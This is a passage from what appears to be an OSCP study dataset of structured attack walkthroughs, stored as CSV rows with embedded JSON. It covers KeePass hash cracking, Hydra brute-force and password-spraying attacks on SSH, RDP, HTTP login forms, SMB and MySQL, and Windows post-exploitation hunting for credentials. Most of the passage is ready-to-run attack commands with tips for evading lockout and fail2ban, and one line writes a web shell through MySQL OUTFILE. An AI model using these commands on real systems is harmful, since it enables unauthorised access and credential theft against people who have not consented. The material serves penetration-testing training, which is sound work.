""shows"": ""Session started""}, {""id"": ""monitor-crack-progress"", ""example"": ""watch -n 5 'hashcat --session=exam-target1 --status 2>&1 | grep -E \""Progress|Speed|Recovered|Time\""'"", ""shows"": ""Progress percentage increasing""}]}, {""title"": ""Phase 6: Database Access and Exploitation"", ""notes"": ""After successful crack: Verify password immediately: keepass2 <DATABASE> or KeePass.exe. If keyfile required: keepass2 <DATABASE> --keyfile <KEYFILE>. Explore database contents: Credentials (usernames, passwords, URLs), Notes (network diagrams, procedures, API keys), Attachments (SSH keys, certificates, scripts). Document all findings: Screenshot entries, Export credentials to file, Note password patterns for other attacks. Test credentials immediately: SSH, RDP, SMB, web applications. Check for: Password reuse across services, Privileged accounts, Service accounts with excessive permissions."", ""commands"": [{""id"": ""hashcat-show-cracked"", ""example"": ""hashcat -m 0 hashes.txt --show"", ""shows"": ""<HASH>:<PASSWORD>""}]}]"
"network-authentication-attacks","Network Authentication Attacks","Attack network service authentication using dictionary and password spraying techniques with THC Hydra","PASSWORD_ATTACKS|NETWORK_AUTH|HYDRA|OSCP:HIGH|DICTIONARY_ATTACK|PASSWORD_SPRAY","{""how_to_recognize"": [""Nmap scan reveals authentication-required services: SSH (22), RDP (3389), FTP (21), HTTP POST forms"", ""Banner grabbing shows service versions (outdated services may have default credentials)"", ""Service enumeration shows no anonymous access or guest accounts disabled"", ""Web application login forms use POST requests to /login, /admin, /wp-login.php"", ""Initial credential attempts (admin:admin, root:root) manually fail""], ""when_to_look_for"": [""After initial port scanning and service enumeration (nmap)"", ""When you've identified valid usernames but no credentials (enum4linux, LDAP queries, email harvesting)"", ""After discovering password policies via error messages or brute-force testing"", ""When account lockout policies are absent or lenient (3+ failed attempts allowed)"", ""During OSCP exam when you have IPs but no initial foothold""]}","[{""title"": ""Scenario 1: SSH Single User Dictionary Attack"", ""context"": ""You've identified a Linux target (192.168.45.100) running SSH on port 22. Through web enumeration, you discovered a username 'developer' in a directory listing (/home/developer/). You suspect the developer uses a weak password from rockyou.txt. No account lockout policy detected after 10 failed login attempts."", ""approach"": ""1. Confirm SSH service is accessible with nmap -p 22. 2. Prepare rockyou.txt wordlist (14M passwords). 3. Use Hydra with single username mode (-l developer). 4. Monitor progress with verbose output (-V). 5. Limit parallel tasks to avoid detection (-t 4). 6. Wait 30 seconds between attempts to avoid triggering fail2ban (-w 30). 7. Save results to file for documentation (-o ssh-cracks.txt)."", ""commands"": [""hydra-ssh-single-user"", ""hydra-verbose"", ""hydra-parallel-tasks"", ""hydra-wait-time"", ""hydra-output-file""], ""expected_outcome"": ""Hydra tests rockyou.txt against 'developer' account. If password exists in wordlist, Hydra displays: '[22][ssh] host: 192.168.45.100   login: developer   password: summer2023'. SSH login confirmed with: ssh developer@192.168.45.100. Time estimate: 14M passwords \u00f7 4 parallel tasks \u00f7 2 attempts/second = ~24 hours (run overnight). Early hit possible (rockyou sorted by frequency)."", ""why_this_works"": ""SSH typically uses PAM authentication (Linux). No built-in account lockout by default. Fail2ban may be absent or misconfigured. Hydra parallelizes connections (4 simultaneous SSH handshakes). Each connection: TCP handshake \u2192 SSH banner \u2192 Username \u2192 Password attempt \u2192 Success/Fail. Successful crack returns 0 exit code, failed password shows 'Authentication failed'. Dictionary attack succeeds when: 1) User chose common password (top 1000 rockyou = 30% hit rate), 2) No rate limiting enforced, 3) Service doesn't log/alert on failed attempts.""}, {""title"": ""Scenario 2: RDP Password Spraying Attack"", ""context"": ""You've enumerated a Windows domain and discovered 50 valid usernames via LDAP queries (users.txt). You know the corporate password policy: 8+ chars, 1 uppercase, 1 digit, 1 special. Common pattern observed: FirstnameYear! (e.g., Sarah2024!). RDP (port 3389) allows 5 failed attempts before 30-minute lockout. You need credentials without triggering lockouts."", ""approach"": ""1. Create small targeted wordlist matching observed pattern: common names + current year + !. 2. Use password spraying mode: Test EACH password against ALL users before moving to next password. 3. Use -L (user list) and -p (single password) mode. 4. Iterate through passwords manually to avoid lockout. 5. Set -t 1 (sequential, not parallel) to be stealthy. 6. Resume session if interrupted (-R). 7. Verify hits with xfreerdp immediately."", ""commands"": [""hydra-rdp-spray"", ""hydra-parallel-tasks"", ""hydra-resume-session"", ""hydra-show-attempts"", ""hydra-output-file""], ""expected_outcome"": ""Hydra tests Password1! against all 50 users, then Password2!, etc. Lockout avoided (only 1 attempt per user per password). Expected hits: 2-5 accounts (10% hit rate realistic for pattern-matched wordlist). Output: '[3389][rdp] host: 192.168.45.100   login: sarah.jones   password: Sarah2024!'. Time estimate: 10 passwords \u00d7 50 users \u00d7 5 sec/attempt = 42 minutes. Immediate foothold via RDP. Document all credentials for password reuse testing."", ""why_this_works"": ""Password spraying evades lockout by staying under attempt threshold. Corporate users follow patterns (compliance with policy). Season/year appending extremely common (Spring2024!, Summer2024!). RDP authentication via CredSSP/NLA. Single password across many users is stealthier than many passwords on one user (fewer log entries per account). Lockout policy typically: X failed attempts in Y time window. Spraying spreads attempts across time + accounts. Success rate: Targeted wordlist (100 words) > Generic wordlist (14M words) for time-constrained scenarios.""}, {""title"": ""Scenario 3: HTTP POST Login Form Attack"", ""context"": ""You've discovered a web application at http://192.168.45.100/admin/ with custom login form. Burp Suite reveals POST request to /admin/login.php with parameters: username, password, submit=Login. You've found 'admin' is a valid username (different error for valid vs invalid user). No CAPTCHA detected. Session cookies not required for login attempt. Target: Crack admin password."", ""approach"": ""1. Capture POST request with Burp (right-click \u2192 Copy to file). 2. Identify failure string in response (e.g., 'Invalid password' or 'Login failed'). 3. Construct Hydra HTTP POST form syntax: '/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid password'. 4. Use rockyou.txt for password list. 5. Monitor for success (absence of failure string). 6. Use -V for verbose output to see each attempt. 7. Set -f to stop on first valid password found."", ""commands"": [""hydra-http-post-form"", ""hydra-verbose"", ""hydra-show-attempts"", ""hydra-output-file""], ""expected_outcome"": ""Hydra sends POST requests to /admin/login.php with username=admin and passwords from rockyou.txt. Monitors responses for failure string absence. Success: '[80][http-post-form] host: 192.168.45.100   login: admin   password: admin123'. Verify by logging in via browser with admin:admin123. Access admin panel, look for: File upload, command execution, database access, config files. Time: 14M passwords \u00f7 16 tasks \u00f7 10 req/sec = ~24 hours (optimize with smaller wordlist first)."", ""why_this_works"": ""HTTP POST forms are stateless (no session required for authentication). Hydra automates POST request construction. ^USER^ and ^PASS^ are placeholders Hydra replaces with candidates. Failure string detection: Hydra parses HTML response, looks for specified string. Success = string NOT found (indicates different response). Works because: Web apps often have weak passwords (no complexity enforcement), No rate limiting on login endpoint, CAPTCHA absent, Account lockout not implemented. Alternative: If login uses cookies/CSRF, use Burp Intruder instead.""}, {""title"": ""Scenario 4: SMB Authentication with Combo Attack"", ""context"": ""You've obtained a list of 20 username:password pairs from a previous breach (combo.txt format: john:Password1, sarah:Summer2024, etc.). Target Windows file server (192.168.45.100) allows SMB authentication (port 445). You want to test if any of these credential pairs are reused. Credentials in combo.txt format (username:password, one per line)."", ""approach"": ""1. Verify combo.txt format: username:password (colon-separated, no spaces). 2. Use Hydra's -C flag for combo mode (reads pairs from file). 3. Target SMB service on port 445. 4. Use -t 1 to avoid account lockout (test pairs sequentially). 5. Set -f to stop on first valid pair. 6. Save output to file for documentation. 7. Verify successful credentials immediately with smbclient or CrackMapExec."", ""commands"": [""hydra-combo-attack"", ""hydra-smb-attack"", ""hydra-parallel-tasks"", ""hydra-output-file"", ""hydra-verbose""], ""expected_outcome"": ""Hydra tests each username:password pair from combo.txt against SMB service. Success: '[445][smb] host: 192.168.45.100   login: sarah.jones   password: Summer2024!'. Immediate verification: smbclient -L \\\\192.168.45.100 -U sarah.jones (enter password, list shares). Time: 20 pairs \u00d7 3 sec/attempt = 60 seconds. Password reuse common in corporate environments. Use valid credentials for: Share enumeration, lateral movement, credential dumping, privilege escalation."", ""why_this_works"": ""Password reuse is endemic. Users use same passwords across: Personal accounts, Corporate accounts, Different services in same network. Combo lists from breaches (LinkedIn, Adobe, etc.) provide real username:password pairs. SMB authentication via NTLM/Kerberos. Domain-joined machines accept domain credentials. Hydra's combo mode optimizes for known pairs (faster than cartesian product). Success indicates: 1) User reused breached password, 2) Corporate password policy allows weak passwords, 3) No credential rotation enforced. Defense: Password manager, MFA, regular password changes.""}, {""title"": ""Scenario 5: MySQL Database Brute-Force"", ""context"": ""Nmap scan reveals MySQL database on 192.168.45.100:3306. Banner shows MySQL 5.7 (no known authentication bypass). Default 'root' account confirmed (different error for valid vs invalid user). You suspect weak root password. No network firewall restricting your IP. Goal: Gain root database access for credential extraction."", ""approach"": ""1. Confirm MySQL service with: nmap -p 3306 --script mysql-info. 2. Create small custom wordlist: MySQL defaults (root, toor, mysql, password) + rockyou top 1000. 3. Use Hydra with -l root (single user mode). 4. Set -t 4 for parallel connections. 5. Monitor with -V for progress. 6. Use -w 5 to avoid triggering connection limits. 7. On success, verify with: mysql -h 192.168.45.100 -u root -p."", ""commands"": [""hydra-mysql-attack"", ""hydra-verbose"", ""hydra-parallel-tasks"", ""hydra-wait-time"", ""hydra-output-file""], ""expected_outcome"": ""Hydra tests passwords against MySQL root account. Success: '[3306][mysql] host: 192.168.45.100   login: root   password: root'. Verification: mysql -h 192.168.45.100 -u root -p (enter 'root', gain shell). Enumerate databases: SHOW DATABASES; Look for: wordpress (wp_users table), application DBs (credentials), mysql.user (password hashes). Time: 1000 passwords \u00f7 4 tasks \u00f7 2 attempts/sec = ~2 minutes. Extract hashes for offline cracking or pivot via stored procedures (UDF exploitation)."", ""why_this_works"": ""MySQL default installation often has weak root password (root, mysql, or blank). DBAs prioritize availability over security. Remote root login enabled by default in older versions. Hydra uses MySQL protocol (TCP 3306). Authentication: Client connects \u2192 Server sends challenge \u2192 Client sends hashed password \u2192 Server verifies. Failed attempt = 'Access denied'. Success = Connection established. No account lockout in MySQL (application-level, not DB-level). Success enables: SELECT * FROM mysql.user (dump all DB users), Reading files: SELECT LOAD_FILE('/etc/passwd'), Writing files (if FILE privilege): SELECT 'shell' INTO OUTFILE '/var/www/shell.php'.""}]","[{""title"": ""Phase 1: Pre-Attack Reconnaissance"", ""notes"": ""Before launching password attacks, gather intelligence to optimize success rate and minimize detection. Identify: Valid usernames, Password policy (length, complexity, lockout), Service versions (default credentials), Attack surface (open ports, authentication methods)."", ""commands"": [{""id"": ""hydra-show-attempts"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100"", ""shows"": ""Shows discovered services/users/shares""}, {""id"": ""hydra-verbose"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -V ssh://192.168.45.100"", ""shows"": ""[ATTEMPT] target <TARGET> - login <USER> - pass <PASS>""}]}, {""title"": ""Phase 2: Wordlist Preparation"", ""notes"": ""Select wordlist based on scenario: Generic attack = rockyou.txt (14M passwords), Targeted attack = Custom wordlist (company patterns, seasons, years), Combo attack = Breached credential pairs. Optimize: Filter by policy (minimum length, complexity), Sort by frequency (most common first), Add mutations (rules for variations)."", ""commands"": [{""id"": ""hydra-ssh-single-user"", ""example"": ""hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100"", ""shows"": ""[22][ssh] host: <TARGET>   login: <USERNAME>   password: ...""}, {""id"": ""hydra-rdp-spray"", ""example"": ""hydra -L /usr/share/wordlists/dirb/others/names.txt -p \""SuperS3cure1337#\"" rdp://192.168.45.100"", ""shows"": ""[3389][rdp] host: <TARGET>   login: <USER>   password: <P...""}, {""id"": ""hydra-combo-attack"", ""example"": ""hydra -C creds.txt ssh://192.168.45.100"", ""shows"": ""valid password found""}]}, {""title"": ""Phase 3: Attack Execution"", ""notes"": ""Launch Hydra attack with appropriate flags: -l (single user) or -L (user list), -p (single password) or -P (password list), -C (combo mode), -t (parallel tasks: 4 for SSH, 1 for spraying), -w (wait time to evade detection), -V (verbose for monitoring), -o (output file for documentation). Monitor progress and adjust if needed."", ""commands"": [{""id"": ""hydra-ssh-single-user"", ""example"": ""hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100"", ""shows"": ""[22][ssh] host: <TARGET>   login: <USERNAME>   password: ...""}, {""id"": ""hydra-rdp-spray"", ""example"": ""hydra -L /usr/share/wordlists/dirb/others/names.txt -p \""SuperS3cure1337#\"" rdp://192.168.45.100"", ""shows"": ""[3389][rdp] host: <TARGET>   login: <USER>   password: <P...""}, {""id"": ""hydra-http-post-form"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.45.100 http-post-form \""/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid\"""", ""shows"": ""[80][http-post-form] host: <TARGET>   login: <USER>   pas...""}, {""id"": ""hydra-smb-attack"", ""example"": ""hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.45.100"", ""shows"": ""[445][smb] host: <TARGET>   login: <USER>   password: <PASS>""}, {""id"": ""hydra-mysql-attack"", ""example"": ""hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.45.100"", ""shows"": ""[3306][mysql] host: <TARGET>   login: <USER>   password: ...""}, {""id"": ""hydra-ftp-attack"", ""example"": ""hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.45.100"", ""shows"": ""[21][ftp] host: <TARGET>   login: <USER>   password: <PASS>""}, {""id"": ""hydra-combo-attack"", ""example"": ""hydra -C creds.txt ssh://192.168.45.100"", ""shows"": ""valid password found""}]}, {""title"": ""Phase 4: Session Management"", ""notes"": ""For long-running attacks (>1 hour), use session management: --session=<NAME> to enable pause/resume, Ctrl+C to pause gracefully, -R to restore session. Monitor progress: Check output file periodically, Use -V to see real-time attempts, Estimate time remaining: (Total passwords \u00f7 Parallel tasks) \u00f7 Attempts per second."", ""commands"": [{""id"": ""hydra-resume-session"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -R ssh://192.168.45.100"", ""shows"": ""Restoring session from file""}, {""id"": ""hydra-show-attempts"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100"", ""shows"": ""Shows discovered services/users/shares""}, {""id"": ""hydra-output-file"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100"", ""shows"": ""Shows discovered services/users/shares""}]}, {""title"": ""Phase 5: Post-Exploitation Verification"", ""notes"": ""Immediately verify cracked credentials: SSH: ssh user@target, RDP: xfreerdp /u:user /p:pass /v:target, HTTP: Login via browser, SMB: smbclient -L \\\\target -U user, MySQL: mysql -h target -u user -p. Document: Username, Password, Service, Timestamp, Access level. Test for: Password reuse on other services, Privilege escalation opportunities, Lateral movement paths."", ""commands"": [{""id"": ""hydra-show-attempts"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100"", ""shows"": ""Shows discovered services/users/shares""}, {""id"": ""hydra-output-file"", ""example"": ""hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100"", ""shows"": ""Shows discovered services/users/shares""}]}]"
"windows-enumeration-procedures","Windows Local Enumeration Procedures","Comprehensive Windows local enumeration methodology for privilege escalation reconnaissance. Based on OSCP Module 17 - covers situational awareness, user/group discovery, network enumeration, sensitive information hunting, PowerShell artifacts, and automated tools.","WINDOWS|ENUMERATION|POST_EXPLOITATION|PRIVILEGE_ESCALATION|CREDENTIAL_HUNTING|OSCP:HIGH","{""how_to_recognize"": [""You gained shell access on a Windows machine (bind shell, reverse shell, RDP, WinRM)"", ""Need to understand current privileges before attempting privilege escalation"", ""Machine is standalone or workgroup (not domain-joined, or doing local-only enumeration)"", ""Looking for sensitive information, credentials, or privilege escalation vectors""], ""when_to_look_for"": [""Immediately after gaining initial foothold on Windows target"", ""Before attempting any privilege escalation techniques"", ""When you need to understand user landscape for credential attacks"", ""During OSCP exam when compromising Windows standalone machines""], ""key_concepts"": [""SID Structure: S-R-X-Y format where RID >= 1000 = custom users, well-known SIDs include S-1-5-32-544 (Administrators)"", ""Access Tokens: Primary token = process identity, Impersonation token = different security context"", ""Integrity Levels: System > High > Medium > Low > Untrusted (UAC uses filtered admin tokens at Medium level)"", ""Get-History vs PSReadline: Clear-History does NOT clear PSReadline's ConsoleHost_history.txt"", ""Cyclical Re-enumeration: After pivoting to a new user, RESTART sensitive file searches. Files that returned 'Access Denied' may now be readable. Each new user context expands your search scope - this is critical for OSCP Module 17.1.3 Hidden in Plain View technique.""]}","[{""title"": ""Scenario 1: Initial Shell - Complete Situational Awareness"", ""context"": ""You exploited a vulnerability and got a bind shell on port 4444 as user 'dave' on CLIENTWK220. You need to understand who you are, what system you're on, and what users exist before attempting privilege escalation."", ""approach"": ""Run identity commands first (whoami, groups, privileges), then system info, then user/group enumeration. This establishes complete situational awareness within 2-3 minutes. Focus on identifying local administrators and interesting group memberships."", ""commands"": [""win-whoami-basic"", ""win-whoami-groups"", ""win-whoami-priv"", ""win-systeminfo-basic"", ""ps-get-localuser"", ""ps-get-localgroup"", ""ps-get-localgroupmember""], ""expected_outcome"": ""You'll know: current user and hostname, group memberships (Remote Desktop Users, helpdesk, etc.), whether Potato exploits are viable (SeImpersonatePrivilege), OS version for kernel exploit research, all local users (identify admin-like names: daveadmin, backupadmin), and who is in Administrators group. This baseline enables targeted privilege escalation."", ""why_this_works"": ""Windows built-in commands provide all this information without any tool uploads. Situational awareness prevents wasted time on attacks that won't work (e.g., Potato exploits without SeImpersonate, kernel exploits on patched systems). Understanding user landscape reveals credential reuse opportunities.""}, {""title"": ""Scenario 2: User and Group Deep Dive"", ""context"": ""Initial enumeration revealed interesting users (backupadmin, daveadmin) and custom groups (adminteam, helpdesk). You need to understand the full access picture: who has admin rights, who can RDP, who can use WinRM."", ""approach"": ""Enumerate membership of all security-relevant groups. Focus on Administrators (escalation targets), Remote Desktop Users (RDP access), Remote Management Users (WinRM access), and Backup Operators (file access). For interesting users, get detailed information including last logon and group memberships."", ""commands"": [""ps-get-localgroupmember"", ""win-net-localgroup-members"", ""win-net-user-detail""], ""expected_outcome"": ""Complete map of who has what access: 'backupadmin and daveadmin are local Administrators', 'steve can RDP and WinRM', 'dave is only in helpdesk group'. This tells you which credentials to target and what access each credential would provide."", ""why_this_works"": ""Group membership determines attack vectors. Local Administrators = SYSTEM access after credential theft. Remote Desktop Users = GUI access (valuable for runas). Remote Management Users = evil-winrm access. Backup Operators = can read/write any file (privilege escalation vector).""}, {""title"": ""Scenario 3: Sensitive Information Hunt"", ""context"": ""You know KeePass and XAMPP are installed (from Get-ItemProperty enumeration). Users often store passwords in text files and configuration files contain plaintext credentials. Time to search for low-hanging fruit before attempting complex privilege escalation."", ""approach"": ""Search for password manager databases (.kdbx), application configuration files (*.ini, *.txt in XAMPP), and user documents that might contain credentials. Check Desktop, Documents, and Downloads for meeting notes or password files. Always search XAMPP/WAMP/IIS directories for database credentials."", ""commands"": [""ps-get-installed-apps"", ""ps-search-kdbx"", ""ps-search-config-files"", ""ps-search-user-docs""], ""expected_outcome"": ""Potential finds: KeePass database (crack with keepass2john + hashcat), meeting notes with test passwords (asdf.txt containing 'Steve's password: securityIsNotAnOption++++++'), MySQL config with database passwords (my.ini with 'admin123admin123!'), web.config with connection strings. Any of these could provide immediate privilege escalation."", ""why_this_works"": ""Users are lazy about password security. Meeting notes, text files on Desktop, and configuration files frequently contain plaintext credentials. XAMPP/WAMP/IIS installations commonly have default or weak database passwords. Password reuse is extremely common - a password found for one service often works for user accounts.""}, {""title"": ""Scenario 4: PowerShell Artifact Analysis"", ""context"": ""The user 'dave' has been using PowerShell. Administrators often type credentials directly into PowerShell commands and mistakenly use Clear-History thinking it removes all traces. PowerShell transcription may also be enabled, recording commands and output."", ""approach"": ""Check Get-History for current session (likely empty if new shell). The gold mine is PSReadline's ConsoleHost_history.txt - it persists across all sessions and is NOT cleared by Clear-History. Also search for transcript files which record commands AND output."", ""commands"": [""ps-get-history"", ""ps-get-psreadline-path"", ""ps-read-psreadline"", ""ps-search-transcripts""], ""expected_outcome"": ""PSReadline history often contains: ConvertTo-SecureString with plaintext passwords, Enter-PSSession with credentials, Set-Secret storing passwords in vault. Transcripts show full session output including successful authentication. Example find: '$password = ConvertTo-SecureString \""qwertqwertqwert123!!\"" -AsPlainText -Force' with '$cred = New-Object PSCredential(\""daveadmin\"", $password)'"", ""why_this_works"": ""Administrators misunderstand PowerShell history. Clear-History only clears the in-memory Get-History, NOT the persistent PSReadline history file. PSReadline stores ALL commands from ALL sessions, often for months. Transcription (when enabled) is even better - it shows exact credentials in context with their usage.""}, {""title"": ""Scenario 5: Automated Enumeration and Credential Testing"", ""context"": ""Manual enumeration found potential credentials (passwords from files, PSReadline history). Before testing each credential individually, run WinPEAS for comprehensive automated enumeration that might reveal additional vectors. Then test found credentials using runas or evil-winrm."", ""approach"": ""Transfer and run WinPEAS for automated discovery of unquoted service paths, AlwaysInstallElevated, cached credentials, scheduled tasks, etc. Review findings focusing on RED highlights. Then test any discovered or collected credentials against privileged user accounts identified in earlier enumeration."", ""commands"": [""win-privesc-winpeas"", ""win-runas-cmd""], ""expected_outcome"": ""WinPEAS may reveal: unquoted service paths (C:\\Program Files\\My Service\\service.exe), AlwaysInstallElevated registry keys, AutoLogon credentials, weak service permissions. Combined with found credentials, you can test access: runas /user:backupadmin cmd with password 'admin123admin123!' found in my.ini. Success = privilege escalation achieved."", ""why_this_works"": ""WinPEAS automates dozens of manual checks in minutes. While it may miss some findings (always validate with manual checks), it provides comprehensive overview. Testing credentials works because password reuse is pervasive - a MySQL password is often also the user's Windows password. Administrators often use the same password across multiple accounts.""}, {""title"": ""Scenario 6: Hidden in Plain View - Credential Pivot"", ""context"": ""You've compromised a low-privilege user (dave) and identified KeePass and XAMPP are installed. Search for credentials in config files and user documents, then pivot to a new user. After each pivot, restart the search with new permissions - files that returned 'Access Denied' may now be readable."", ""approach"": ""Target installed applications for credential files: password manager databases, config files with database passwords, and user documents with meeting notes. Read found files carefully - permission denied errors indicate files to revisit after privilege escalation. Test found credentials by checking target user's groups first (Remote Desktop Users? Administrators?), then use appropriate access method (RDP, WinRM, runas)."", ""commands"": [""ps-get-installed-apps"", ""ps-search-kdbx"", ""ps-search-app-config"", ""ps-search-user-docs"", ""ps-type-file"", ""ps-registry-autologon"", ""win-net-user-detail"", ""win-runas-cmd""], ""expected_outcome"": ""Find cleartext credentials in config files (XAMPP my.ini: 'password = admin123admin123!'), meeting notes (asdf.txt: 'Steve's password: securityIsNotAnOption++++++'), or password files. Verify target user groups with 'net user steve' (Remote Desktop Users for RDP, Administrators for high-value target), then pivot using runas (GUI required) or evil-winrm. CRITICAL: After pivoting to new user, restart sensitive file search - previously denied files may now be readable (e.g., my.ini as steve that dave couldn't read)."", ""why_this_works"": ""Users store passwords in text files instead of password managers. Config files contain cleartext database credentials often reused for Windows accounts. Permission errors during search indicate high-value files - note them for re-check after privilege escalation. The cyclical nature of enumeration means each new user access expands your search scope. Example from OSCP module: dave -> steve (found password in asdf.txt) -> backupadmin (found password in my.ini that steve could read but dave couldn't).""}]","[{""title"": ""Phase 1: Identity and Context"", ""notes"": ""First commands after gaining shell access. Establishes who you are, your group memberships, and privileges. Check for SeImpersonatePrivilege (Potato exploits viable)."", ""commands"": [{""id"": ""win-whoami-basic"", ""example"": ""whoami"", ""shows"": ""clientwk220\\dave""}, {""id"": ""win-whoami-groups"", ""example"": ""whoami /groups"", ""shows"": ""GROUP INFORMATION: helpdesk, Remote Desktop Users, Users...""}, {""id"": ""win-whoami-priv"", ""example"": ""whoami /priv"", ""shows"": ""PRIVILEGES INFORMATION: SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege...""}]}, {""title"": ""Phase 2: User and Group Enumeration"", ""notes"": ""Identify all local users and groups. Look for admin-like usernames (daveadmin, backupadmin). Check Administrators group for escalation targets. Use PowerShell or legacy net commands based on availability."", ""commands"": [{""id"": ""ps-get-localuser"", ""example"": ""Get-LocalUser"", ""shows"": ""Name: Administrator (Disabled), BackupAdmin, dave, daveadmin, steve...""}, {""id"": ""ps-get-localgroup"", ""example"": ""Get-LocalGroup"", ""shows"": ""Administrators, adminteam, BackupUsers, helpdesk, Remote Desktop Users...""}, {""id"": ""ps-get-localgroupmember"", ""example"": ""Get-LocalGroupMember Administrators"", ""shows"": ""Administrator, backupadmin, daveadmin, offsec""}, {""id"": ""win-net-user-local"", ""example"": ""net user"", ""shows"": ""User accounts for \\\\CLIENTWK220: Administrator, BackupAdmin, dave...""}, {""id"": ""win-net-user-detail"", ""example"": ""net user steve"", ""shows"": ""Local Group Memberships: *helpdesk *Remote Desktop Users *Remote Management Users""}]}, {""title"": ""Phase 3: System Information"", ""notes"": ""Understand OS version, architecture, and patch level. Critical for kernel exploit research and tool compatibility (32-bit vs 64-bit)."", ""commands"": [{""id"": ""win-systeminfo-basic"", ""example"": ""systeminfo"", ""shows"": ""OS Name: Microsoft Windows 11 Pro, System Type: x64-based PC, Hotfix(s): KB5015684...""}]}, {""title"": ""Phase 4: Network Enumeration"", ""notes"": ""Understand network position, identify other connected users, discover running services. Active RDP connections indicate other users (potential credential capture with Mimikatz after privesc)."", ""commands"": [{""id"": ""win-ipconfig-all"", ""example"": ""ipconfig /all"", ""shows"": ""IPv4 Address: 192.168.50.220, DNS Servers: 8.8.8.8, DHCP Enabled: No""}, {""id"": ""win-route-print"", ""example"": ""route print"", ""shows"": ""IPv4 Route Table: 0.0.0.0/0.0.0.0 via 192.168.50.254""}, {""id"": ""win-netstat-ano"", ""example"": ""netstat -ano"", ""shows"": ""TCP 0.0.0.0:80 LISTENING 3340, TCP 192.168.50.220:3389 ESTABLISHED 1148""}]}, {""title"": ""Phase 5: Applications and Processes"", ""notes"": ""Identify installed applications for exploit research and credential opportunities. Running processes reveal services (correlate with netstat PIDs). Look for password managers, FTP clients, databases."", ""commands"": [{""id"": ""ps-get-installed-apps"", ""example"": ""Get-ItemProperty \""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\"" | select displayname"", ""shows"": ""FileZilla 3.63.1, KeePass Password Safe 2.51.1, XAMPP, VMware Tools...""}, {""id"": ""ps-get-process"", ""example"": ""Get-Process"", ""shows"": ""httpd (3340), mysqld (3508), powershell (9756), filezilla (2632)...""}]}, {""title"": ""Phase 6: Sensitive Information Discovery"", ""notes"": ""Search for password files, configuration files, documents, and registry credentials. Target installed applications (XAMPP, KeePass, IIS), deployment files (unattend.xml), user directories, and registry AutoLogon. CRITICAL: Note files returning 'Access Denied' for re-check after privilege escalation."", ""commands"": [{""id"": ""ps-search-kdbx"", ""example"": ""Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\Users\\dave\\Documents\\Passwords.kdbx""}, {""id"": ""ps-search-app-config"", ""example"": ""Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\xampp\\passwords.txt, C:\\xampp\\mysql\\bin\\my.ini""}, {""id"": ""ps-search-user-docs"", ""example"": ""Get-ChildItem -Path C:\\Users\\dave\\ -Include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\Users\\dave\\Desktop\\asdf.txt""}, {""id"": ""ps-type-file"", ""example"": ""type C:\\xampp\\mysql\\bin\\my.ini"", ""shows"": ""[client] password = admin123admin123!""}, {""id"": ""ps-search-deployment-files"", ""example"": ""Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml,sysprep.inf -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\Windows\\Panther\\unattend.xml""}, {""id"": ""ps-search-webconfig"", ""example"": ""Get-ChildItem -Path C:\\inetpub\\wwwroot -Include web.config,*.config -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\inetpub\\wwwroot\\myapp\\web.config""}, {""id"": ""ps-search-password-patterns"", ""example"": ""Get-ChildItem -Path C:\\Users -Include *password*,*cred*,*secret* -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\Users\\dave\\Desktop\\passwords.txt""}, {""id"": ""ps-registry-autologon"", ""example"": ""Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword"", ""shows"": ""DefaultUserName: backupadmin, DefaultPassword: admin123admin123!""}, {""id"": ""ps-cmdkey-list"", ""example"": ""cmdkey /list"", ""shows"": ""Target: TERMSRV/dc01.corp.local Type: Domain Password User: corp\\admin""}]}, {""title"": ""Phase 7: PowerShell Artifacts"", ""notes"": ""CRITICAL: Check PSReadline history - it persists even after Clear-History! Contains credentials from all previous sessions. Also search for transcript files which record commands AND output."", ""commands"": [{""id"": ""ps-get-history"", ""example"": ""Get-History"", ""shows"": ""Id CommandLine (empty if new session or Clear-History was run)""}, {""id"": ""ps-get-psreadline-path"", ""example"": ""(Get-PSReadlineOption).HistorySavePath"", ""shows"": ""C:\\Users\\dave\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt""}, {""id"": ""ps-read-psreadline"", ""example"": ""type C:\\Users\\dave\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"", ""shows"": ""Set-Secret -Name \""Server02 Admin PW\"" -Secret \""paperEarMonitor33@\""\nClear-History\nStart-Transcript...""}, {""id"": ""ps-search-transcripts"", ""example"": ""Get-ChildItem -Path C:\\Users\\ -Include *transcript* -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""C:\\Users\\Public\\Transcripts\\transcript01.txt""}]}, {""title"": 